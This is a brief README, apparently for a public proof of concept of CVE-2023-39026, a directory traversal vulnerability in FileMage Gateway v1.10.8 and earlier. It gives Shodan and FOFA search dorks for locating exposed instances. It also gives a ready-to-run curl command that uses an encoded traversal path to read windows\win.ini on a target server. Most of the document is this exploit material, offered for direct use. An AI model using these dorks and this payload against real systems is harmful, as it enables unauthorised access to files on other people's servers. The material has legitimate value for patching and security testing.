# CVE-2023-39026

![](https://img.shields.io/static/v1?label=Product&message=FileMage%20Gateway&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=v.1.10.8%20and%20before&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%20%20Directory%20Traversal&color=red)

For the full writeup, click [here](https://raindayzz.com/technicalblog/2023/08/20/FileMage-Vulnerability.html).

- Shodan dork:
```
http.favicon.hash:"-209293751"
```
- FOFA dork:
```
icon_hash="-209293751"
```

### Curl PoC
```
curl -k -X 'GET' "http://target_ip_address:port/mgmnt/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5 cwindows%5cwin.ini"
```

